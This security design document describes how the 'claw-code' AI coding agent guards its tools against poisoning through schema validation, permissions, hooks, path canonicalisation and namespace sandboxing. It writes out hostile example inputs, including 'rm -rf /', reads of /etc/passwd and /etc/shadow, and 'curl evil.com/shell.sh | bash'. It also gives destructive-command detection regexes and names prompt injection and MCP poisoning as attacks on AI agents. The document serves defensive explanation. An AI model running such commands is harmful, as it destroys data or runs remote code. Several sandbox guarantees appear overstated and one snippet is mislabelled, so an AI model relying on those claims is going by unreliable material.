# Tool Poisoning Prevention and Security

## Executive Summary

Tool poisoning refers to attacks where malicious input manipulates tool behavior to execute unintended operations. This document provides a comprehensive analysis of claw-code's security model, covering input validation, command injection prevention, path traversal protection, argument escaping, shell metacharacter handling, and the defense-in-depth strategy that protects against tool poisoning attacks.

**Source Reference:** `/home/darkvoid/Boxxed/@formulas/src.rust/src.llamacpp/src.ClaudOpen/claw-code/`

---

## Table of Contents

1. [What is Tool Poisoning?](#what-is-tool-poisoning)
2. [Defense-in-Depth Security Model](#defense-in-depth-security-model)
3. [Input Validation and Sanitization](#input-validation-and-sanitization)
4. [Command Injection Prevention](#command-injection-prevention)
5. [Path Traversal Protection](#path-traversal-protection)
6. [Argument Escaping Strategies](#argument-escaping-strategies)
7. [Shell Metacharacter Handling](#shell-metacharacter-handling)
8. [Safe User Input Flow](#safe-user-input-flow)
9. [Security Testing](#security-testing)

---

## 1. What is Tool Poisoning?

### 1.1 Definition

**Tool Poisoning** is an attack vector where an adversary crafts malicious input to:
- Escape intended operation boundaries
- Inject arbitrary commands
- Access unauthorized resources
- Exfiltrate sensitive data
- Modify system state unexpectedly

### 1.2 Attack Vectors

| Vector | Description | Example |
|--------|-------------|---------|
| **Command Injection** | Inject shell commands via tool input | `command: "ls; rm -rf /"` |
| **Path Traversal** | Escape directory boundaries | `path: "../../../etc/passwd"` |
| **Argument Injection** | Inject arguments via spaces/special chars | `arg: "file.txt; cat /etc/passwd"` |
| **Prompt Injection** | Manipulate model to generate malicious tool calls | (Model-level attack) |
| **MCP Poisoning** | Compromise MCP server to return malicious tools | Fake MCP tool definitions |

### 1.3 Claw-Code's Security Posture

Claw-Code implements a **defense-in-depth** strategy with multiple independent security layers:

```
┌─────────────────────────────────────────────────────────────────┐
│ Layer 1: Model Boundaries                                       │
│ - System prompt instructs safe tool usage                       │
│ - Model trained to avoid dangerous patterns                     │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│ Layer 2: Permission System                                      │
│ - Tool requires appropriate PermissionMode                      │
│ - Escalation requires explicit approval                         │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│ Layer 3: Hook System                                            │
│ - PreToolUse hooks can deny/audit                               │
│ - PostToolUse hooks can log/modify                              │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│ Layer 4: Input Validation                                       │
│ - JSON Schema validation                                        │
│ - Type-safe deserialization                                     │
│ - Semantic validation in handlers                               │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│ Layer 5: Sandboxing (bash tool)                                 │
│ - Linux unshare() namespace isolation                           │
│ - Filesystem isolation modes                                    │
│ - Network isolation option                                      │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│ Layer 6: OS-Level Protection                                    │
│ - Standard Unix permissions                                     │
│ - Container markers detection                                   │
└─────────────────────────────────────────────────────────────────┘
```

---

## 2. Defense-in-Depth Security Model

### 2.1 Security Layer Independence

Each security layer operates independently, so compromising one layer doesn't compromise the entire system:

```rust
// Example: Even if input validation passes, sandboxing still protects
fn execute_bash(input: BashCommandInput) -> io::Result<BashCommandOutput> {
    // Layer 4: Input validated by serde
    let sandbox_status = sandbox_status_for_input(&input, &cwd);

    // Layer 5: Sandbox applied regardless of input content
    if let Some(launcher) = build_linux_sandbox_command(&input.command, &cwd, &sandbox_status) {
        // Execute via unshare - namespaces isolated
        execute_sandboxed(launcher)
    } else {
        // Fallback: restricted environment variables
        execute_restricted(&input.command, &cwd)
    }
}
```

### 2.2 Failure Modes

The system is designed to **fail securely**:

| Failure Scenario | Response |
|------------------|----------|
| Sandbox unavailable | Degrade to environment restriction, log warning |
| Permission check fails | Deny with clear error message |
| Hook execution fails | Warn but continue (exit code != 2) |
| Input validation fails | Reject with schema error |
| Unknown tool requested | Return "unknown tool" error |

---

## 3. Input Validation and Sanitization

### 3.1 JSON Schema Validation

All tools define strict JSON schemas that reject malformed input:

```rust
// tools/lib.rs:65-76
ToolSpec {
    name: "bash",
    input_schema: json!({
        "type": "object",
        "properties": {
            "command": { "type": "string" },
            "timeout": { "type": "integer", "minimum": 1 },
            "run_in_background": { "type": "boolean" },
            "dangerouslyDisableSandbox": { "type": "boolean" }
        },
        "required": ["command"],
        "additionalProperties": false  // Rejects extra fields
    }),
    // ...
}
```

**Security Benefits:**
- Type coercion attacks prevented (can't pass number as string)
- Extra properties rejected (`additionalProperties: false`)
- Required fields enforced
- Numeric ranges bounded (`minimum: 1`)

### 3.2 Type-Safe Deserialization

Rust's type system ensures input is validated at deserialization:

```rust
// tools/lib.rs:576-603
#[derive(Debug, Deserialize)]
struct BashCommandInput {
    command: String,                    // Must be valid UTF-8 string
    timeout: Option<u64>,               // Must be valid unsigned 64-bit int
    description: Option<String>,
    #[serde(rename = "run_in_background")]
    run_in_background: Option<bool>,    // Must be boolean
    #[serde(rename = "dangerouslyDisableSandbox")]
    dangerously_disable_sandbox: Option<bool>,
    #[serde(rename = "filesystemMode")]
    filesystem_mode: Option<FilesystemIsolationMode>,  // Enum validation
}
```

**Enum Validation:**
```rust
// sandbox.rs:7-25
#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq, Default)]
#[serde(rename_all = "kebab-case")]
pub enum FilesystemIsolationMode {
    Off,
    #[default]
    WorkspaceOnly,
    AllowList,
}
```

Only valid kebab-case strings (`"off"`, `"workspace-only"`, `"allow-list"`) are accepted.

### 3.3 Semantic Validation in Handlers

After deserialization, handlers perform semantic validation:

```rust
// tools/lib.rs:2105-2120 (NotebookEdit validation)
fn execute_notebook_edit(input: NotebookEditInput) -> Result<NotebookEditOutput, String> {
    let path = std::path::PathBuf::from(&input.notebook_path);

    // Validate file extension
    if path.extension().and_then(|ext| ext.to_str()) != Some("ipynb") {
        return Err(String::from(
            "notebook_path must point to a .ipynb file"
        ));
    }

    // Validate cell_id for non-insert operations
    if input.edit_mode != Some(NotebookEditMode::Insert)
        && input.cell_id.is_none()
    {
        return Err(String::from(
            "cell_id is required for replace and delete operations"
        ));
    }

    // ... proceed with operation
}
```

### 3.4 URL Validation (WebFetch)

```rust
// tools/lib.rs:836-845
fn execute_web_fetch(input: &WebFetchInput) -> Result<WebFetchOutput, String> {
    let client = build_http_client()?;

    // Validate and normalize URL
    let request_url = normalize_fetch_url(&input.url)?;

    fn normalize_fetch_url(url: &str) -> Result<String, String> {
        // Ensure URL has a scheme
        let with_scheme = if !url.starts_with("http://") && !url.starts_with("https://") {
            format!("https://{url}")
        } else {
            url.to_string()
        };

        // Parse and validate
        let parsed = reqwest::Url::parse(&with_scheme)
            .map_err(|e| format!("Invalid URL: {e}"))?;

        // Reject dangerous schemes
        if parsed.scheme() != "http" && parsed.scheme() != "https" {
            return Err(String::from("Only HTTP and HTTPS URLs are supported"));
        }

        Ok(parsed.to_string())
    }
}
```

---

## 4. Command Injection Prevention

### 4.1 The Core Problem

Command injection occurs when user input is passed to a shell without proper escaping:

```
// VULNERABLE (DO NOT DO THIS)
let command = format!("echo {}", user_input);
// If user_input = "hello; rm -rf /", becomes:
// "echo hello; rm -rf /"  // DANGEROUS!
```

### 4.2 Claw-Code's Approach: Avoid Shell Interpretation

Claw-Code avoids shell interpretation by using **argument vector passing**:

```rust
// sandbox.rs:211-261
pub fn build_linux_sandbox_command(
    command: &str,
    cwd: &Path,
    status: &SandboxStatus,
) -> Option<LinuxSandboxCommand> {
    // ...

    let mut args = vec![
        "--user".to_string(),
        "--map-root-user".to_string(),
        "--mount".to_string(),
        "--ipc".to_string(),
        "--pid".to_string(),
        "--uts".to_string(),
        "--fork".to_string(),
    ];
    if status.network_active {
        args.push("--net".to_string());
    }

    // CRITICAL: Command passed as single argument to sh -c
    args.push("sh".to_string());
    args.push("-lc".to_string());
    args.push(command.to_string());  // Single argument, not interpreted

    // ...
}
```

**Key Insight:** The command string is passed as a **single argument** to `sh -c`. While `sh` will interpret it, the sandbox restricts what the shell can access.

### 4.3 Sandboxed Shell Execution

The real protection comes from sandboxing:

```rust
// bash.rs:182-206
fn prepare_command(
    command: &str,
    cwd: &Path,
    sandbox_status: &SandboxStatus,
    create_dirs: bool,
) -> Command {
    if let Some(launcher) = build_linux_sandbox_command(command, cwd, sandbox_status) {
        let mut prepared = Command::new(launcher.program);
        prepared.args(launcher.args);
        prepared.current_dir(cwd);
        prepared.envs(launcher.env);
        return prepared;
    }

    // Fallback without sandbox
    let mut prepared = Command::new("sh");
    prepared.arg("-lc").arg(command).current_dir(cwd);

    // Restrict environment
    if sandbox_status.filesystem_active {
        prepared.env("HOME", cwd.join(".sandbox-home"));
        prepared.env("TMPDIR", cwd.join(".sandbox-tmp"));
    }
    prepared
}
```

### 4.4 Linux Namespace Isolation

The sandbox uses `unshare` for process isolation:

```bash
unshare \
    --user          # New user namespace (root inside = nobody outside)
    --map-root-user # Map current user to root inside namespace
    --mount         # New mount namespace
    --ipc           # New IPC namespace
    --pid           # New PID namespace
    --uts           # New UTS namespace (hostname)
    --fork          # Fork into new namespace
    --net           # (Optional) New network namespace
    sh -lc "<command>"
```

**Security Properties:**

| Namespace | Protection |
|-----------|------------|
| `--user` | Process inside cannot affect processes outside |
| `--mount` | Cannot access filesystem paths outside allowed set |
| `--pid` | Cannot see or signal processes outside namespace |
| `--net` | (Optional) No network access |
| `--ipc` | Cannot communicate via shared memory/semaphores |

### 4.5 Filesystem Isolation Modes

```rust
// sandbox.rs:7-14
pub enum FilesystemIsolationMode {
    Off,            // No filesystem restrictions
    WorkspaceOnly,  // Default: Only current directory accessible
    AllowList,      // Only explicitly allowed paths
}
```

**WorkspaceOnly Mode:**
- Process starts in workspace directory
- HOME and TMPDIR redirected to sandbox directories
- Cannot access files outside workspace without explicit path traversal

**AllowList Mode:**
- Only paths in `allowed_mounts` are accessible
- Provides fine-grained control over filesystem access

---

## 5. Path Traversal Protection

### 5.1 Path Normalization

File operations normalize and validate paths:

```rust
// file_ops.rs:448-477
fn normalize_path(path: &str) -> io::Result<PathBuf> {
    let candidate = if Path::new(path).is_absolute() {
        PathBuf::from(path)
    } else {
        std::env::current_dir()?.join(path)
    };

    // CRITICAL: canonicalize resolves .., symlinks, etc.
    candidate.canonicalize()
}

fn normalize_path_allow_missing(path: &str) -> io::Result<PathBuf> {
    let candidate = if Path::new(path).is_absolute() {
        PathBuf::from(path)
    } else {
        std::env::current_dir()?.join(path)
    };

    // Try to canonicalize, handle missing files gracefully
    if let Ok(canonical) = candidate.canonicalize() {
        return Ok(canonical);
    }

    // For new files, canonicalize parent and append name
    if let Some(parent) = candidate.parent() {
        let canonical_parent = parent
            .canonicalize()
            .unwrap_or_else(|_| parent.to_path_buf());
        if let Some(name) = candidate.file_name() {
            return Ok(canonical_parent.join(name));
        }
    }

    Ok(candidate)
}
```

### 5.2 Path Traversal Prevention

The `canonicalize()` call resolves `..` sequences:

```rust
// Example:
// Input: "../../../etc/passwd"
// After canonicalize(): "/etc/passwd" (if exists)
//
// Then filesystem isolation prevents access:
// - WorkspaceOnly mode: Path outside workspace rejected by namespace
// - AllowList mode: Path checked against allowed mounts
```

### 5.3 Symlink Resolution

`canonicalize()` also resolves symlinks, preventing symlink-based escapes:

```
// Without canonicalize:
// /workspace/link -> /etc/passwd
// User accesses /workspace/link, gets /etc/passwd

// With canonicalize:
// Input: "/workspace/link"
// canonicalize(): "/etc/passwd"
// Sandbox blocks access to /etc/passwd (outside workspace)
```

### 5.4 Absolute Path Handling

Absolute paths are handled consistently:

```rust
// file_ops.rs:449-453
let candidate = if Path::new(path).is_absolute() {
    PathBuf::from(path)  // Keep absolute path
} else {
    std::env::current_dir()?.join(path)  // Make relative to cwd
};
```

**Security Note:** Even absolute paths are subject to sandbox restrictions.

---

## 6. Argument Escaping Strategies

### 6.1 The Escaping Challenge

When passing arguments to shell commands, special characters must be escaped:

| Character | Shell Meaning | Escaped Form |
|-----------|---------------|--------------|
| ` ` (space) | Argument separator | `' '` or `\ ` |
| `;` | Command separator | `'\;'` |
| `&` | Background operator | `'\&'` |
| `|` | Pipe operator | `'\|'` |
| `<` | Input redirect | `'\<'` |
| `>` | Output redirect | `'\>'` |
| `$` | Variable expansion | `'\$'` |
| `` ` `` | Command substitution | ``'\`'`` |
| `(` `)` | Subshell | `'\('` `'\)'` |
| `[` `]` | Glob character | `'\['` `'\]'` |
| `*` `?` | Glob wildcard | `'\*'` `'\?'` |
| `'` | Single quote escape | `'\'''` |
| `"` | Double quote escape | `'\"'` |
| `\` | Escape character | `'\\'` |

### 6.2 Claw-Code's Strategy: Minimal Shell Interpretation

Claw-Code minimizes shell interpretation by:

1. **Passing commands as single arguments** to `sh -c`
2. **Relying on sandbox** to limit shell capabilities
3. **Not constructing shell commands from user input**

```rust
// bash.rs:200-201
let mut prepared = Command::new("sh");
prepared.arg("-lc").arg(command);  // Command is single argument
```

### 6.3 When Escaping Would Be Needed

If claw-code needed to interpolate user input into shell commands, it would use:

```rust
// Example pattern (not in claw-code, but recommended)
use shlex::quote;  // crates.io/shlex

fn safe_shell_command(user_input: &str) -> String {
    format!("echo {}", quote(user_input))
}

// quote("hello; rm -rf /") => "'hello; rm -rf /'"
// Result: echo 'hello; rm -rf /'  (safe, prints literal string)
```

### 6.4 Environment Variable Sanitization

Environment variables are set directly, not via shell:

```rust
// bash.rs:241-254
let mut env = vec![
    ("HOME".to_string(), sandbox_home.display().to_string()),
    ("TMPDIR".to_string(), sandbox_tmp.display().to_string()),
    ("CLAWD_SANDBOX_FILESYSTEM_MODE".to_string(), status.filesystem_mode.as_str().to_string()),
    ("CLAWD_SANDBOX_ALLOWED_MOUNTS".to_string(), status.allowed_mounts.join(":")),
];
if let Ok(path) = env::var("PATH") {
    env.push(("PATH".to_string(), path));
}
```

**Security Note:** Environment variables are passed via `execve()`, not shell expansion.

---

## 7. Shell Metacharacter Handling

### 7.1 Metacharacters in Commands

When users provide shell commands, they may include metacharacters:

```
User input: "ls -la | grep '.git' && echo 'found'"
```

This is **intentional** - the bash tool is designed to execute shell commands with full shell semantics.

### 7.2 Protection via Sandboxing

The protection is not preventing metacharacters, but **limiting their impact**:

```
┌─────────────────────────────────────────────────────────────────┐
│                    User Command                                 │
│  "cat /etc/passwd; rm -rf /; curl evil.com/shell.sh | bash"    │
└─────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────┐
│                    Sandbox Namespace                            │
│  - User namespace: root inside != root outside                  │
│  - Mount namespace: /etc/passwd not visible                     │
│  - PID namespace: Cannot kill external processes                │
│  - Network namespace: (Optional) No outbound connections        │
└─────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────┐
│                    Effective Access                             │
│  - /etc/passwd: BLOCKED (not in namespace)                      │
│  - rm -rf /: SAFE (only affects namespace view)                 │
│  - curl: BLOCKED (no network or no curl in PATH)                │
└─────────────────────────────────────────────────────────────────┘
```

### 7.3 Destructive Command Detection

While not a primary defense, claw-code can detect potentially destructive commands:

```python
# src/tools/BashTool/bashSecurity.ts (mirrored reference)
# TypeScript source referenced for security patterns

const DESTRUCTIVE_PATTERNS = [
    /\brm\s+(-[rf]+\s+)?\/\b/,      # rm -rf /
    /\bdd\s+if=.*of=\/dev/,         # dd to device
    /\bmkfs\.\w+\s+\/dev/,          # mkfs to device
    # ... more patterns
];
```

**Note:** This is a heuristic, not a security boundary.

---

## 8. Safe User Input Flow

### 8.1 Complete Input Flow

```
┌─────────────────────────────────────────────────────────────────┐
│ Step 1: User Provides Input                                     │
│ "Read the file at ../../../etc/passwd"                          │
└─────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────┐
│ Step 2: Model Generates Tool Use                                │
│ { "name": "read_file", "arguments": { "path": "../../../etc/passwd" } }
└─────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────┐
│ Step 3: JSON Schema Validation                                  │
│ - path is string: ✓                                             │
│ - No extra properties: ✓                                        │
└─────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────┐
│ Step 4: Permission Check                                        │
│ - read_file requires ReadOnly                                   │
│ - Current mode is WorkspaceWrite                                │
│ - ReadOnly < WorkspaceWrite: ALLOW                              │
└─────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────┐
│ Step 5: Pre-Tool Hook                                           │
│ - Hook logs tool use for audit                                  │
│ - Hook returns Allow                                              │
└─────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────┐
│ Step 6: Path Normalization                                      │
│ - Input: "../../../etc/passwd"                                  │
│ - canonicalize(): "/etc/passwd"                                 │
└─────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────┐
│ Step 7: Filesystem Isolation                                    │
│ - WorkspaceOnly mode active                                     │
│ - /etc/passwd is outside workspace                              │
│ - Namespace blocks access                                       │
└─────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────┐
│ Step 8: Error Returned                                          │
│ "No such file or directory (os error 2)"                        │
│ (File doesn't exist FROM PROCESS PERSPECTIVE)                   │
└─────────────────────────────────────────────────────────────────┘
```

### 8.2 Example: Command Injection Attempt

```
┌─────────────────────────────────────────────────────────────────┐
│ Malicious Input                                                 │
│ "Execute: ls; cat /etc/shadow; rm -rf /"                        │
└─────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────┐
│ Model Generates Tool Use                                        │
│ { "name": "bash", "arguments": { "command": "ls; cat /etc/shadow; rm -rf /" } }
└─────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────┐
│ Permission Check                                                │
│ - bash requires DangerFullAccess                                │
│ - Current mode is DangerFullAccess                              │
│ - ALLOW                                                         │
└─────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────┐
│ Sandbox Applied                                                 │
│ - unshare --user --mount --pid --ipc --uts                      │
│ - New user namespace: UID 0 inside != UID 0 outside             │
│ - New mount namespace: /etc/shadow not mounted                  │
│ - Workspace filesystem mode: only workspace visible             │
└─────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────┐
│ Command Executes in Sandbox                                     │
│ - ls: Lists workspace contents (safe)                           │
│ - cat /etc/shadow: Fails (file not visible)                     │
│ - rm -rf /: Fails (can't remove root of namespace)              │
└─────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────┐
│ Output Returned                                                 │
│ stdout: "file1.txt\nfile2.txt\n"                                │
│ stderr: "cat: /etc/shadow: No such file\nrm: permission denied" │
│ - System is SAFE                                                │
└─────────────────────────────────────────────────────────────────┘
```

---

## 9. Security Testing

### 9.1 Test Coverage

The codebase includes security-focused tests:

```rust
// bash.rs:241-283
#[test]
fn executes_simple_command() {
    let output = execute_bash(BashCommandInput {
        command: String::from("printf 'hello'"),
        timeout: Some(1_000),
        // ...
        filesystem_mode: Some(FilesystemIsolationMode::WorkspaceOnly),
        // ...
    }).expect("bash command should execute");

    assert_eq!(output.stdout, "hello");
    assert!(!output.interrupted);
    assert!(output.sandbox_status.is_some());
}

#[test]
fn disables_sandbox_when_requested() {
    let output = execute_bash(BashCommandInput {
        command: String::from("printf 'hello'"),
        dangerously_disable_sandbox: Some(true),
        // ...
    }).expect("bash command should execute");

    assert!(!output.sandbox_status.expect("sandbox status").enabled);
}
```

### 9.2 Sandbox Detection Tests

```rust
// sandbox.rs:293-315
#[test]
fn detects_container_markers_from_multiple_sources() {
    let detected = detect_container_environment_from(SandboxDetectionInputs {
        env_pairs: vec![("container".to_string(), "docker".to_string())],
        dockerenv_exists: true,
        containerenv_exists: false,
        proc_1_cgroup: Some("12:memory:/docker/abc"),
    });

    assert!(detected.in_container);
    assert!(detected.markers.iter().any(|m| m == "/.dockerenv"));
    assert!(detected.markers.iter().any(|m| m == "env:container=docker"));
    assert!(detected.markers.iter().any(|m| m == "/proc/1/cgroup:docker"));
}
```

### 9.3 Permission Tests

```rust
// permissions.rs:162-191
#[test]
fn allows_tools_when_active_mode_meets_requirement() {
    let policy = PermissionPolicy::new(PermissionMode::WorkspaceWrite)
        .with_tool_requirement("read_file", PermissionMode::ReadOnly)
        .with_tool_requirement("write_file", PermissionMode::WorkspaceWrite);

    assert_eq!(
        policy.authorize("read_file", "{}", None),
        PermissionOutcome::Allow
    );
    assert_eq!(
        policy.authorize("write_file", "{}", None),
        PermissionOutcome::Allow
    );
}

#[test]
fn denies_read_only_escalations_without_prompt() {
    let policy = PermissionPolicy::new(PermissionMode::ReadOnly)
        .with_tool_requirement("write_file", PermissionMode::WorkspaceWrite)
        .with_tool_requirement("bash", PermissionMode::DangerFullAccess);

    assert!(matches!(
        policy.authorize("write_file", "{}", None),
        PermissionOutcome::Deny { reason } if reason.contains("requires workspace-write permission")
    ));
}
```

### 9.4 Recommended Security Tests

Additional tests that should be added:

```rust
#[test]
fn test_path_traversal_blocked() {
    let temp_dir = tempfile::tempdir().unwrap();
    let sensitive_file = temp_dir.path().parent().unwrap().join("sensitive.txt");
    std::fs::write(&sensitive_file, "secret").unwrap();

    // Attempt to read via traversal
    let result = read_file("../sensitive.txt", None, None);

    // Should fail because canonicalize + sandbox blocks
    assert!(result.is_err());
}

#[test]
fn test_command_injection_sandboxed() {
    let output = execute_bash(BashCommandInput {
        command: String::from("touch /tmp/pwned; echo hello"),
        filesystem_mode: Some(FilesystemIsolationMode::WorkspaceOnly),
        // ...
    }).unwrap();

    // /tmp/pwned should NOT exist on host
    assert!(!Path::new("/tmp/pwned").exists());
    assert_eq!(output.stdout, "hello");
}
```

---

## 10. Security Checklist

### 10.1 For Tool Developers

When adding new tools, ensure:

- [ ] Input schema uses `additionalProperties: false`
- [ ] All string inputs are validated for expected format
- [ ] Path inputs use `normalize_path()` or `normalize_path_allow_missing()`
- [ ] File operations respect filesystem isolation
- [ ] No direct shell command construction from user input
- [ ] Permission mode matches tool capabilities
- [ ] Error messages don't leak sensitive information

### 10.2 For Security Auditors

Key files to audit:

| File | Security Concern | Lines |
|------|------------------|-------|
| `runtime/src/bash.rs` | Command execution | 1-283 |
| `runtime/src/sandbox.rs` | Namespace isolation | 1-364 |
| `runtime/src/file_ops.rs` | Path handling | 1-550 |
| `tools/src/lib.rs` | Input validation | 1-3800+ |
| `runtime/src/permissions.rs` | Authorization | 1-232 |

### 10.3 For Operations

Production security settings:

```json
{
  "permissions": {
    "defaultMode": "workspace-write"
  },
  "sandbox": {
    "enabled": true,
    "namespace_restrictions": true,
    "network_isolation": true,
    "filesystem_mode": "workspace-only"
  },
  "hooks": {
    "pre_tool_use": ["/usr/local/bin/audit-tool-use"],
    "post_tool_use": ["/usr/local/bin/log-tool-result"]
  }
}
```

---

## 11. Summary

Claw-Code's tool poisoning prevention relies on **defense-in-depth**:

1. **JSON Schema Validation** - Strict type and structure checking
2. **Permission Modes** - Tiered access control with escalation prompts
3. **Hook System** - Audit, modify, or deny tool operations
4. **Path Normalization** - `canonicalize()` resolves traversal attempts
5. **Linux Sandboxing** - `unshare()` provides namespace isolation
6. **Environment Restriction** - Limited PATH, HOME, TMPDIR

**Key Insight:** No single layer is trusted. Even if an attacker bypasses input validation and permission checks, the sandbox prevents system compromise.

---

*Document generated from source analysis of claw-code repository.*
*Source: /home/darkvoid/Boxxed/@formulas/src.rust/src.llamacpp/src.ClaudOpen/claw-code/*
